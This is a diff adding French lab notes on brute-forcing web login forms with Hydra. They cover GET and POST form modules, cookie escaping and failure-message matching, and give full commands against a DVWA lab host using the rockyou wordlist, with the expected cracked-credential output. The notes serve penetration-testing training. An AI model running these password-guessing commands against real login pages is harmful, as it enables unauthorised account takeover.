@@ -172,3 +172,133 @@ hydra -R    # reprendre la dernière session interrompue
 /usr/share/seclists/Passwords/            # collections variées
 /usr/share/seclists/Usernames/            # listes de usernames
 ```
+
+# Hydra — brute force HTTP
+
+> Hydra attaque des formulaires web en testant des milliers de combinaisons login/password.
+> Deux modules principaux : `http-get-form` et `http-post-form`.
+
+---
+
+## Structure de base
+
+```
+hydra -l USER -P wordlist CIBLE MODULE 'PATH:PARAMS:F=MESSAGE_ECHEC'
+```
+
+Les trois parties séparées par `:` dans la chaîne :
+```
+'PATH : PARAMS : F=MESSAGE_ECHEC'
+```
+
+**Toujours utiliser des guillemets simples `'`** autour de toute la chaîne.
+
+---
+
+## Identifier GET ou POST
+
+Regarde l'URL après avoir soumis le formulaire :
+
+**GET** — les données sont dans l'URL :
+```
+http://site.com/login?username=admin&password=1234
+→ utilise http-get-form
+```
+
+**POST** — l'URL ne change pas, les données sont cachées :
+```
+http://site.com/login  (URL identique)
+→ utilise http-post-form
+```
+
+---
+
+## http-get-form — sans cookie
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
+  '/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid credentials' \
+  -t 4 -f
+```
+
+---
+
+## http-get-form — avec cookie (page protégée)
+
+**RÈGLE CRITIQUE** : le `:` dans `Cookie:` doit être échappé avec `\:`
+sinon Hydra l'interprète comme un séparateur de section.
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
+  '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=abc123; security=low:F=Username and/or password incorrect' \
+  -t 4 -f
+```
+
+Points clés :
+- Guillemets **simples** `'` autour de toute la chaîne
+- `H=Cookie\:` — le `:` échappé avec `\`
+- `F=` avant le message d'échec — pas de point `.` à la fin
+- `security=low` après le PHPSESSID séparé par `;`
+
+---
+
+## Récupérer le cookie
+
+**Dans Firefox :**
+```
+F12 → Storage → Cookies → copier PHPSESSID et security
+```
+
+**Avec curl :**
+```bash
+curl -s "http://IP/dvwa/vulnerabilities/brute/?username=admin&password=FAUX&Login=Login" \
+  -b "PHPSESSID=abc123; security=low" | grep -i "incorrect\|welcome\|error"
+```
+
+---
+
+## Le message d'échec — crucial
+
+- Toujours **copier-coller** depuis la page — jamais taper à la main
+- Utilise `F=` devant le message
+- Pas de point `.` à la fin
+
+```
+F=Username and/or password incorrect
+```
+
+---
+
+## Options utiles
+
+```bash
+-l admin          # username fixe
+-L users.txt      # liste de usernames
+-p password       # password fixe
+-P rockyou.txt    # liste de passwords
+-t 4              # threads parallèles
+-f                # stop au premier résultat
+-o found.txt      # sauvegarde les résultats
+-v                # verbose
+```
+
+---
+
+## Commande complète DVWA — testée et fonctionnelle
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.159.142 http-get-form \
+  '/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=TON_PHPSESSID; security=low:F=Username and/or password incorrect' \
+  -t 4 -f
+```
+
+Remplace `TON_PHPSESSID` par la valeur dans Firefox F12 → Storage → Cookies.
+
+---
+
+## Résultat attendu
+
+```
+[80][http-get-form] host: 192.168.159.142   login: admin   password: password
+[STATUS] attack finished for 192.168.159.142 (valid pair found)
+```
